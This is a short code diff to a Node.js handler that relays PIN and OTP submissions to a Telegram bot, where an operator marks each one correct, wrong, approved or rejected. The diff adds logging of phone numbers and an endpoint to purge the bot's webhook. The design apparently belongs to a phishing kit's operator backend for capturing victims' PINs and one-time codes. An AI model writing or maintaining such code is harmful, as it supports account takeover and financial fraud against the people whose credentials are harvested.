@@ -198,7 +198,9 @@ async function handleCallback(cq) {
     const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
     const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
     const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
+    console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
     const rec = await store.get(store.NS.LOGIN, id);
+    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
     if (rec) {
       rec.status = decision;
       rec.decided = true;
@@ -295,6 +297,14 @@ module.exports = async (req, res) => {
       const proto = req.headers['x-forwarded-proto'] || 'https';
       setWebhook(host, proto, (r) => {
         res.status(200).json({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
+      });
+      return;
+    }
+
+    // GET /api/setup/purge-webhook -> clear webhook to allow local polling
+    if (req.method === 'GET' && url.startsWith('/api/setup/purge-webhook')) {
+      tgApi('setWebhook', { url: '' }, (r) => {
+        res.status(200).json({ ok: r && r.ok, description: r && r.description });
       });
       return;
     }
